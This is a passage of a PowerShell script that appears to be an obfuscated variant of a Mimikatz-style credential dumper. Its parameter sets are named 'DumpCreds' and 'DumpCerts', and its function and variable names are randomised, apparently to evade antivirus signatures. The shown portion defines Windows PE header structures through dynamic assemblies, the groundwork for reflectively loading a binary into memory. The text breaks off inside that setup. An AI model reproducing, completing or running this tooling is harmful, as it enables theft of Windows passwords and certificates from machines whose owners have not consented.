function confiscating
{


[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$ehnOWVQvGXKAGFe,

    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    $PzJb99YSmILWOaA,

    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $jPTwNPVvGbu9YYR,

    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)

Set-StrictMode -Version 2


$eaxHY99szInnbHG = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$fKmtReldlnsntbf,

        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$SVJAqEBa9vxwmRA,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$vn9ghTF9VBkrmom,
				
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$ZAmDbs99R9CgAnI,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$TgLQjSaIcQeLnpr,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $yDmQaeYubI9INki
	)
	



	Function levelled
	{
		$robWSZfqWDtAXZH = New-Object System.Object



		$nIVsnMejpezx9OG = [AppDomain]::CurrentDomain
		$v99DqeAdwEAiD9K = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$zCtoQZQOHDSBcIv = $nIVsnMejpezx9OG.DefineDynamicAssembly($v99DqeAdwEAiD9K, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$BgziPuxjGuFGcQq = $zCtoQZQOHDSBcIv.DefineDynamicModule('DynamicModule', $false)
		$pFIMqeERPkYR9KT = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]




		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineEnum('MachineType', 'Public', [UInt16])
		$PVtshc9ShixoeKK.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$EUkuCXLyQmuS99c = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name MachineType -Value $EUkuCXLyQmuS99c


		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineEnum('MagicType', 'Public', [UInt16])
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$HrHRrHOumxFJb9o = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name MagicType -Value $HrHRrHOumxFJb9o


		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineEnum('SubSystemType', 'Public', [UInt16])
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$mFsCxCekPqEJCru = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $mFsCxCekPqEJCru


		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$PVtshc9ShixoeKK.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$PVtshc9ShixoeKK.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$PUrhUTEvbGaIT9b = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $PUrhUTEvbGaIT9b



		$dquJDhf9OLQn9Yd = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('IMAGE_DATA_DIRECTORY', $dquJDhf9OLQn9Yd, [System.ValueType], 8)
		($PVtshc9ShixoeKK.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($PVtshc9ShixoeKK.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$9gYwHxdeLXAWISE = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $9gYwHxdeLXAWISE


		$dquJDhf9OLQn9Yd = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('IMAGE_FILE_HEADER', $dquJDhf9OLQn9Yd, [System.ValueType], 20)
		$PVtshc9ShixoeKK.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$HJ9S9vJWiz9vXeb = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $HJ9S9vJWiz9vXeb


		$dquJDhf9OLQn9Yd = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('IMAGE_OPTIONAL_HEADER64', $dquJDhf9OLQn9Yd, [System.ValueType], 240)
		($PVtshc9ShixoeKK.DefineField('Magic', $HrHRrHOumxFJb9o, 'Public')).SetOffset(0) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($PVtshc9ShixoeKK.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($PVtshc9ShixoeKK.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($PVtshc9ShixoeKK.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($PVtshc9ShixoeKK.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($PVtshc9ShixoeKK.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($PVtshc9ShixoeKK.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($PVtshc9ShixoeKK.DefineField('Subsystem', $mFsCxCekPqEJCru, 'Public')).SetOffset(68) | Out-Null
		($PVtshc9ShixoeKK.DefineField('DllCharacteristics', $PUrhUTEvbGaIT9b, 'Public')).SetOffset(70) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($PVtshc9ShixoeKK.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($PVtshc9ShixoeKK.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($PVtshc9ShixoeKK.DefineField('ExportTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(112) | Out-Null
		($PVtshc9ShixoeKK.DefineField('ImportTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(120) | Out-Null
		($PVtshc9ShixoeKK.DefineField('ResourceTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(128) | Out-Null
		($PVtshc9ShixoeKK.DefineField('ExceptionTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(136) | Out-Null
		($PVtshc9ShixoeKK.DefineField('CertificateTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(144) | Out-Null
		($PVtshc9ShixoeKK.DefineField('BaseRelocationTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(152) | Out-Null
		($PVtshc9ShixoeKK.DefineField('Debug', $9gYwHxdeLXAWISE, 'Public')).SetOffset(160) | Out-Null
		($PVtshc9ShixoeKK.DefineField('Architecture', $9gYwHxdeLXAWISE, 'Public')).SetOffset(168) | Out-Null
		($PVtshc9ShixoeKK.DefineField('GlobalPtr', $9gYwHxdeLXAWISE, 'Public')).SetOffset(176) | Out-Null
		($PVtshc9ShixoeKK.DefineField('TLSTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(184) | Out-Null
		($PVtshc9ShixoeKK.DefineField('LoadConfigTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(192) | Out-Null
		($PVtshc9ShixoeKK.DefineField('BoundImport', $9gYwHxdeLXAWISE, 'Public')).SetOffset(200) | Out-Null
		($PVtshc9ShixoeKK.DefineField('IAT', $9gYwHxdeLXAWISE, 'Public')).SetOffset(208) | Out-Null
		($PVtshc9ShixoeKK.DefineField('DelayImportDescriptor', $9gYwHxdeLXAWISE, 'Public')).SetOffset(216) | Out-Null
		($PVtshc9ShixoeKK.DefineField('CLRRuntimeHeader', $9gYwHxdeLXAWISE, 'Public')).SetOffset(224) | Out-Null
		($PVtshc9ShixoeKK.DefineField('Reserved', $9gYwHxdeLXAWISE, 'Public')).SetOffset(232) | Out-Null
		$9QbjbDa9xcsaMmE = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $9QbjbDa9xcsaMmE


		$dquJDhf9OLQn9Yd = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('IMAGE_OPTIONAL_HEADER32', $dquJDhf9OLQn9Yd, [System.ValueType], 224)
		($PVtshc9ShixoeKK.DefineField('Magic', $HrHRrHOumxFJb9o, 'Public')).SetOffset(0) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($PVtshc9ShixoeKK.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($PVtshc9ShixoeKK.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($PVtshc9ShixoeKK.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($PVtshc9ShixoeKK.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($PVtshc9ShixoeKK.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($PVtshc9ShixoeKK.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($PVtshc9ShixoeKK.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($PVtshc9ShixoeKK.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($PVtshc9ShixoeKK.DefineField('Subsystem', $mFsCxCekPqEJCru, 'Public')).SetOffset(68) | Out-Null
		($PVtshc9ShixoeKK.DefineField('DllCharacteristics', $PUrhUTEvbGaIT9b, 'Public')).SetOffset(70) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($PVtshc9ShixoeKK.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($PVtshc9ShixoeKK.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($PVtshc9ShixoeKK.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($PVtshc9ShixoeKK.DefineField('ExportTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(96) | Out-Null
		($PVtshc9ShixoeKK.DefineField('ImportTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(104) | Out-Null
		($PVtshc9ShixoeKK.DefineField('ResourceTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(112) | Out-Null
		($PVtshc9ShixoeKK.DefineField('ExceptionTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(120) | Out-Null
		($PVtshc9ShixoeKK.DefineField('CertificateTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(128) | Out-Null
		($PVtshc9ShixoeKK.DefineField('BaseRelocationTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(136) | Out-Null
		($PVtshc9ShixoeKK.DefineField('Debug', $9gYwHxdeLXAWISE, 'Public')).SetOffset(144) | Out-Null
		($PVtshc9ShixoeKK.DefineField('Architecture', $9gYwHxdeLXAWISE, 'Public')).SetOffset(152) | Out-Null
		($PVtshc9ShixoeKK.DefineField('GlobalPtr', $9gYwHxdeLXAWISE, 'Public')).SetOffset(160) | Out-Null
		($PVtshc9ShixoeKK.DefineField('TLSTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(168) | Out-Null
		($PVtshc9ShixoeKK.DefineField('LoadConfigTable', $9gYwHxdeLXAWISE, 'Public')).SetOffset(176) | Out-Null
		($PVtshc9ShixoeKK.DefineField('BoundImport', $9gYwHxdeLXAWISE, 'Public')).SetOffset(184) | Out-Null
		($PVtshc9ShixoeKK.DefineField('IAT', $9gYwHxdeLXAWISE, 'Public')).SetOffset(192) | Out-Null
		($PVtshc9ShixoeKK.DefineField('DelayImportDescriptor', $9gYwHxdeLXAWISE, 'Public')).SetOffset(200) | Out-Null
		($PVtshc9ShixoeKK.DefineField('CLRRuntimeHeader', $9gYwHxdeLXAWISE, 'Public')).SetOffset(208) | Out-Null
		($PVtshc9ShixoeKK.DefineField('Reserved', $9gYwHxdeLXAWISE, 'Public')).SetOffset(216) | Out-Null
		$sMPDVX9tQCzvCcu = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $sMPDVX9tQCzvCcu


		$dquJDhf9OLQn9Yd = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('IMAGE_NT_HEADERS64', $dquJDhf9OLQn9Yd, [System.ValueType], 264)
		$PVtshc9ShixoeKK.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('FileHeader', $HJ9S9vJWiz9vXeb, 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('OptionalHeader', $9QbjbDa9xcsaMmE, 'Public') | Out-Null
		$HSYVUJpOlmYz9MS = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $HSYVUJpOlmYz9MS
		

		$dquJDhf9OLQn9Yd = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('IMAGE_NT_HEADERS32', $dquJDhf9OLQn9Yd, [System.ValueType], 248)
		$PVtshc9ShixoeKK.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('FileHeader', $HJ9S9vJWiz9vXeb, 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('OptionalHeader', $sMPDVX9tQCzvCcu, 'Public') | Out-Null
		$99H9xIbWiVZABlb = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $99H9xIbWiVZABlb


		$dquJDhf9OLQn9Yd = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('IMAGE_DOS_HEADER', $dquJDhf9OLQn9Yd, [System.ValueType], 64)
		$PVtshc9ShixoeKK.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$bYMBQXqTrsnnsOp = $PVtshc9ShixoeKK.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$qIIbfQU9Dg9FfBC = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$oT9pCjVifFYYYtK = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$cPSHgGlHVWnHHfW = New-Object System.Reflection.Emit.CustomAttributeBuilder($pFIMqeERPkYR9KT, $qIIbfQU9Dg9FfBC, $oT9pCjVifFYYYtK, @([Int32] 4))
		$bYMBQXqTrsnnsOp.SetCustomAttribute($cPSHgGlHVWnHHfW)

		$PVtshc9ShixoeKK.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$jcrUnLMa9lSNaum = $PVtshc9ShixoeKK.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$qIIbfQU9Dg9FfBC = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$cPSHgGlHVWnHHfW = New-Object System.Reflection.Emit.CustomAttributeBuilder($pFIMqeERPkYR9KT, $qIIbfQU9Dg9FfBC, $oT9pCjVifFYYYtK, @([Int32] 10))
		$jcrUnLMa9lSNaum.SetCustomAttribute($cPSHgGlHVWnHHfW)

		$PVtshc9ShixoeKK.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$tnVdsxzPokcklYY = $PVtshc9ShixoeKK.CreateType()	
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $tnVdsxzPokcklYY


		$dquJDhf9OLQn9Yd = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('IMAGE_SECTION_HEADER', $dquJDhf9OLQn9Yd, [System.ValueType], 40)

		$wBJpKHtmW9sagme = $PVtshc9ShixoeKK.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$qIIbfQU9Dg9FfBC = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$cPSHgGlHVWnHHfW = New-Object System.Reflection.Emit.CustomAttributeBuilder($pFIMqeERPkYR9KT, $qIIbfQU9Dg9FfBC, $oT9pCjVifFYYYtK, @([Int32] 8))
		$wBJpKHtmW9sagme.SetCustomAttribute($cPSHgGlHVWnHHfW)

		$PVtshc9ShixoeKK.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$xAMksVyAeXdJaLj = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $xAMksVyAeXdJaLj


		$dquJDhf9OLQn9Yd = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('IMAGE_BASE_RELOCATION', $dquJDhf9OLQn9Yd, [System.ValueType], 8)
		$PVtshc9ShixoeKK.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$ZK9Mvf9X9UmIwsJ = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $ZK9Mvf9X9UmIwsJ


		$dquJDhf9OLQn9Yd = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('IMAGE_IMPORT_DESCRIPTOR', $dquJDhf9OLQn9Yd, [System.ValueType], 20)
		$PVtshc9ShixoeKK.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('Name', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$cptCleiNKiNMgmK = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $cptCleiNKiNMgmK


		$dquJDhf9OLQn9Yd = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('IMAGE_EXPORT_DIRECTORY', $dquJDhf9OLQn9Yd, [System.ValueType], 40)
		$PVtshc9ShixoeKK.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
